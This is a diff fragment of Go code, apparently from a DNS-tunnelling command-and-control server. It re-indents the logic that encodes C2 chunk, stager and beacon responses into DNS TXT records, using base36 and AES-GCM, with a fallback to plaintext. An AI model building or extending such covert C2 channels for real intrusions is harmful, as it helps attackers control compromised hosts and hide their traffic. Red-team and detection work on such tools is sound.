@@ -245,20 +245,20 @@ func handleQuery(packet []byte, cfg Config, clientIP string) ([]byte, error) {
 				// CHUNK responses are plain text (base64 data is already DNS-safe)
 				// META responses need base36 encoding for DNS compatibility
 				if strings.HasPrefix(c2Response, "CHUNK|") {
-				// CHUNK responses sent as plain text (data is already base64)
-				encoded = c2Response
-			} else if strings.HasPrefix(c2Response, "META|") {
-				// Stager META responses - use base36 encoding only (no encryption)
-				encoded = base36EncodeString(c2Response)
-			} else {
-				// Beacon response - use AES-GCM + base36
-				var encErr error
-				encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
-				if encErr != nil {
-					// Fallback to plain response if encryption fails
+					// CHUNK responses sent as plain text (data is already base64)
 					encoded = c2Response
-				}
-			} // TXT records need proper length-prefixed format
+				} else if strings.HasPrefix(c2Response, "META|") {
+					// Stager META responses - use base36 encoding only (no encryption)
+					encoded = base36EncodeString(c2Response)
+				} else {
+					// Beacon response - use AES-GCM + base36
+					var encErr error
+					encoded, encErr = encryptAndEncode(c2Response, c2Manager.GetEncryptionKey())
+					if encErr != nil {
+						// Fallback to plain response if encryption fails
+						encoded = c2Response
+					}
+				} // TXT records need proper length-prefixed format
 				// Each string in a TXT record can be max 255 bytes
 				var txtData []byte
 
